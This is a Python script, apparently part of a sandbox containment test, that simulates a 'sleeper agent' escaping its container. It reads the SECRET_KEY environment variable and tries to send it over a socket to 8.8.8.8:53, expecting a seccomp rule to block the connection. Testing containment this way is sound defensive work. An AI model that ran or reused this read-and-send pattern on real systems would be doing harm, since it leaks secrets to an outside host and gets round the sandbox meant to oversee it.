#!/usr/bin/env python
"""
Sleeper Payload - Simulated Deceptive Agent
============================================
This script simulates a "sleeper agent" that attempts to:
1. Read sensitive environment variables
2. Exfiltrate data via network connection

WARNING: This is ONLY for testing containment. 
         Must ONLY be run inside the Docker sandbox.
"""

import os
import sys

def main():
    print("[SLEEPER] Agent activated...")
    
    # Step 1: Attempt to read sensitive data
    secret = os.environ.get("SECRET_KEY", "NOT_FOUND")
    print(f"[SLEEPER] Captured SECRET_KEY: {secret}")
    
    # Step 2: Attempt network exfiltration (SHOULD BE BLOCKED)
    print("[SLEEPER] Attempting network exfiltration...")
    
    try:
        import socket
        print("[SLEEPER] Socket module imported successfully")
        
        # Try to create a socket and connect to external server
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[SLEEPER] Socket created, attempting connection to 8.8.8.8:53...")
        
        # This line should trigger seccomp KILL
        sock.connect(("8.8.8.8", 53))
        
        # If we reach here, containment FAILED
        print("[SLEEPER] ⚠️ CONTAINMENT BREACH - Connection successful!")
        sock.sendall(f"EXFIL:{secret}".encode())
        sock.close()
        
    except Exception as e:
        # If blocked by Python-level exception (not kernel)
        print(f"[SLEEPER] Network blocked by exception: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
